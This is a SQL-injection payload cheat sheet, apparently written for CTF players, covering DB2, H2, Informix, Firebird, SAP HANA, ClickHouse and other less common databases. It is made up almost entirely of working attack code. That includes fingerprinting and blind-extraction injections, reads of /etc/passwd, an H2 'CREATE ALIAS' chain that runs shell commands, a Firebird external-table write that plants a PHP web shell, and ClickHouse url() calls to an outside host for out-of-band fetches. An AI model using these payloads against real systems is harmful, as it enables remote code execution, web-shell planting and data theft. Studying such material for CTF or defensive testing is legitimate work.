# Other DBMS — DB2, H2, Informix, Firebird, SAP HANA, ClickHouse,
# CockroachDB, MonetDB, Vertica

Not every challenge sits on the big five. Each of these has its own
quirk set — the payloads are the same grammar, the differences are
in function names, catalog layouts, and which exotic primitive is
enabled by default.

---

## 1. DB2

Fingerprint:

```sql
' UNION SELECT service_level,NULL FROM TABLE(SYSPROC.ENV_GET_INFO())
   x-- -
SELECT versionnumber FROM sysibm.sysversions;
SELECT CURRENT SERVER FROM sysibm.sysdummy1;          -- dual = sysdummy1
SELECT * FROM sysibm.sysdummy1;
SELECT current_schema FROM sysibm.sysdummy1;
```

Tells: `sysibm.sysdummy1` (the dual), `syscat.*`/`sysibm.*` catalogs,
`CAST(x AS varchar(128))`, `||` concat, `chr()` for char, `fetch
first n rows only` instead of LIMIT.

Catalog extraction:

```sql
SELECT tabname FROM syscat.tables WHERE tabschema=current_schema;
SELECT colname FROM syscat.columns WHERE tabname='USERS';
SELECT name FROM sysibm.systables;
SELECT routineschema,routinename FROM syscat.routines;
```

Blind/extraction:

```sql
' AND ASCII(SUBSTR((SELECT name FROM sysibm.systables FETCH
   FIRST 1 ROWS ONLY),1,1))>64-- -
' AND (SELECT COUNT(*) FROM syscat.tables)>5-- -
' AND 1=CAST((SELECT name FROM syscat.tables FETCH FIRST 1 ROWS
   ONLY) AS INT)-- -                                  -- error echo
```

File ops — `ADMIN_CMD` LOAD/EXPORT (needs SYSADM):

```sql
CALL SYSPROC.ADMIN_CMD('LOAD FROM /etc/passwd OF DEL INSERT INTO t');
CALL SYSPROC.ADMIN_CMD('EXPORT TO /tmp/x OF DEL SELECT * FROM t');
SELECT * FROM TABLE(SYSPROC.ADMIN_READ_FILE('/etc/passwd')) t;  -- rare
```

Error echo — `XML` parse trick:

```sql
SELECT XMLPARSE(DOCUMENT concat('<?xml version="1.0"?><r>'||
   (SELECT name FROM sysibm.systables FETCH FIRST 1 ROWS ONLY)||
   '</r>')) FROM sysibm.sysdummy1;
```

---

## 2. H2 — the Java-embedded one (Spring apps, CTF java)

Fingerprint:

```sql
SELECT H2VERSION();                                   -- '2.1.214'
SELECT * FROM INFORMATION_SCHEMA.TABLES;
SELECT VALUE FROM INFORMATION_SCHEMA.SETTINGS WHERE NAME='info.VERSION';
```

Tells: `H2VERSION()`, `INFORMATION_SCHEMA.*` (standard), `||` concat,
`LIMIT`+`OFFSET`, `FILE_READ`, `CSVREAD`, `CSVWRITE`, `LINK_SCHEMA`,
inline `CREATE ALIAS ... AS $$java$$` — THE killer.

The full H2 → RCE chain (one stacked shot):

```sql
'; CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd)
   throws java.io.IOException { java.util.Scanner s =
   new java.util.Scanner(Runtime.getRuntime().exec(cmd)
   .getInputStream()).useDelimiter("\\A");
   return s.hasNext() ? s.next() : ""; }$$;
CALL SHELLEXEC('id');-- -
' UNION SELECT SHELLEXEC('cat /flag'),NULL-- -         -- then read it
```

Also worth probing:

```sql
SELECT FILE_READ('/etc/passwd');                      -- file read
SELECT * FROM CSVREAD('/etc/passwd');                  -- csv table
SELECT * FROM CSVREAD('/etc/passwd','line');
CALL CSVWRITE('/tmp/x','SELECT * FROM users');         -- file write
CREATE ALIAS x AS '//groovy';                          -- groovy alias
   (works if groovy on classpath — SpringBoot often ships it)
CREATE LINKED TABLE x(NULL,'org.h2.Driver','jdbc:h2:mem:x',
   'sa','','SELECT 1');                                -- lateral
```

H2 is the top CTF java-embedded DB — `CREATE ALIAS` enabled-by-
default status depends on the launch flags; if it errors
"Reference constraint violation" the alias path is closed.

---

## 3. Informix

```sql
SELECT DBINFO('version','full') FROM systables WHERE tabid=1;
SELECT * FROM systables;
SELECT FIRST 1 * FROM systables;                      -- FIRST n not LIMIT
' UNION SELECT name,NULL FROM systables-- -
' AND (SELECT name FROM systables WHERE tabid>99 FETCH FIRST 1 ROWS)
   MATCHES 'a*'-- -                                    -- MATCHES not LIKE
```

Tells: `MATCHES` operator, `FIRST n`, `||` concat, `systables`/
`syscolumns`/`sysmaster:*`, `dbinfo()` functions. Rare in CTF but
exists in old enterprise labs.

---

## 4. Firebird

```sql
SELECT rdb$get_context('SYSTEM','ENGINE_VERSION') FROM rdb$database;
SELECT rdb$relation_name FROM rdb$relations;           -- catalog
SELECT FIRST 1 * FROM rdb$relations;                    -- FIRST n
' UNION SELECT rdb$relation_name,NULL FROM rdb$relations-- -
' AND 1=CAST((SELECT rdb$relation_name FROM rdb$relations
   ROWS 1) AS INTEGER)-- -                             -- cast echo
```

Tells: `rdb$*` catalogs, `rdb$database` the dual, `FIRST n`/`SKIP n`,
`ROWS n`, `||` concat, `CAST(... AS int)` echo, `rdb$get_context`.
External tables:

```sql
CREATE TABLE t EXTERNAL FILE '/tmp/x' (f CHAR(80));    -- write file
INSERT INTO t VALUES('<?php system($_GET[c]);?>');
```

---

## 5. SAP HANA / SAP DB / MaxDB

```sql
SELECT * FROM M_DATABASES;
SELECT * FROM SYS.TABLES;
SELECT * FROM PUBLIC.M_SERVICES;
' UNION SELECT TABLE_NAME,NULL FROM SYS.TABLES-- -
```

Tells: `M_*` monitoring views, `SYS.*`, `PUBLIC.*`, `LIMIT`+`OFFSET`,
`||` concat, `TO_VARCHAR`/`CAST`, UDFs via `CREATE PROCEDURE ...
LANGUAGE SQLSCRIPT`. `SUBSTRING`/`LENGTH` standard; `DAYS_BETWEEN`
for time-ish tricks — heavy-query torture for delay.

---

## 6. ClickHouse (analytics, JSON-heavy apps)

```sql
SELECT version();
SELECT * FROM system.tables;
SELECT * FROM system.columns;
SELECT name,database FROM system.tables;
' UNION SELECT name,NULL FROM system.tables-- -
```

Tells: `system.*` tables, `version()`, `||` concat, `LIMIT n,m`,
`format` clauses. ClickHouse is READ-ONLY by design — no
UPDATE/DELETE/INSERT via SQLi in the classic sense; file read via
`file()`/`url()`/`hdfs()` table functions:

```sql
SELECT * FROM file('/etc/passwd','CSV','x String');
SELECT * FROM url('http://me/x','CSV','x String');     -- OOB + fetch
SELECT * FROM s3('http://bkt/f','CSV','x String');
```

`url()` is a free OOB-read + remote-fetch primitive.

---

## 7. CockroachDB (PG-wire compatible, distributed)

```sql
SELECT version();                                      -- 'CockroachDB ...'
SHOW ALL CLUSTER SETTINGS;
SELECT * FROM system.databases;
```

Wire-protocol compatible with PG — most PG payloads work verbatim.
Differences: no `pg_read_file`, no COPY PROGRAM, `SHOW` statements
for settings, `crdb_internal.*` catalog extras.

---

## 8. MonetDB / Vertica / other analytics

```sql
SELECT name FROM sys.tables;            -- MonetDB
SELECT value FROM sys.functions;
SELECT * FROM v_catalog.tables;          -- Vertica
SELECT * FROM v_monitor.system_resource_usage;
```

Analytic engines generally lack UPDATE/file/exec primitives —
extraction is blind-first via the same grammar.

---

## 9. Which-DBMS table — the one-shot discriminator

| Payload | MySQL | PG | MSSQL | Oracle | SQLite | DB2 | H2 | ClickHouse |
|---|---|---|---|---|---|---|---|---|
| `version()` | ver | ver | err | err | err | err | ver | ver |
| `@@version` | ver | err | ver | err | err | err | err | err |
| `sqlite_version()` | err | err | err | err | ver | err | err | err |
| `H2VERSION()` | err | err | err | err | err | err | ver | err |
| `1 FROM dual` | ok | err | ok | ok | ok* | err | ok | ok |
| `1 FROM sysibm.sysdummy1` | err | err | err | err | err | ok | err | err |
| `SELECT 1` | ok | ok | ok | ok | ok | ok | ok | ok |
| `concat('a','b')` | ok | ok | 2012+ | ok | err | ok | ok | ok |
| `'a'\|\|'b'` | 0/err | 'ab' | err | 'ab' | 'ab' | 'ab' | 'ab' | 'ab' |
| `substring` | ok | ok | ok | ok | ok | ok | ok | ok |
| `substr` | ok | ok | err | ok | ok | ok | ok | ok |
| `IF(1,2,3)` | 2 | err | err | err | err | err | ok | ok |
| `IIF(1,2,3)` | err | err | 2012+ | err | ok | err | ok | ok |
| `CASE WHEN 1 THEN 2 ELSE 3 END` | ok | ok | ok | ok | ok | ok | ok | ok |
| `sleep(1)` | sleep | err | err | err | err | err | err | err |
| `pg_sleep(1)` | err | sleep | err | err | err | err | err | err |
| `WAITFOR DELAY '0:0:1'` | err | err | delay | err | err | err | err | err |
| `dbms_pipe.receive_message('x',1)` | err | err | err | delay | err | err | err | err |
| `LIMIT 1` | ok | ok | err | err | ok | err | ok | ok |
| `TOP 1` | err | err | ok | err | err | err | err | err |
| `FETCH FIRST 1 ROWS ONLY` | 8.0+ | 8.4+ | ok | 12c+ | err | ok | ok | ok |
| `ROWNUM=1` | err | err | err | ok | err | err | err | err |
| `current_user` | ok | ok | ok | ok | err | ok | ok | ok |
| `user()` | ok | err | ok | err | err | err | err | err |
| `system_user` | ok | ok | ok | err | err | ok | ok | ok |
| `dual` required? | no | no | no | YES | no | sysdummy1 | no | no |

\* SQLite tolerates `FROM dual` — `dual` resolves as a missing table
only in strict contexts; `SELECT 1 FROM dual` on SQLite errors
"no such table" unless one exists — treat it as err.

---

## 10. Shared blind extractors that work everywhere

```sql
' AND 1=(CASE WHEN (cond) THEN 1 ELSE 0 END)-- -      -- all DBMS
' AND (cond)-- -                                      -- all
' AND (SELECT COUNT(*) FROM <catalog>)>N-- -          -- all
' AND LENGTH(<value>)>N-- -                           -- all
' AND SUBSTR(<value>,1,1)='x'-- -                     -- all but MSSQL
' AND SUBSTRING(<value>,1,1)='x'-- -                  -- all
' AND ASCII(SUBSTRING(<value>,1,1))>N-- -             -- all but SQLite
' AND UNICODE(SUBSTRING(<value>,1,1))>N-- -           -- SQLite
```

When in doubt about the dialect, `CASE WHEN` + `SUBSTRING` +
`LENGTH` is the maximally-portable blind toolkit.
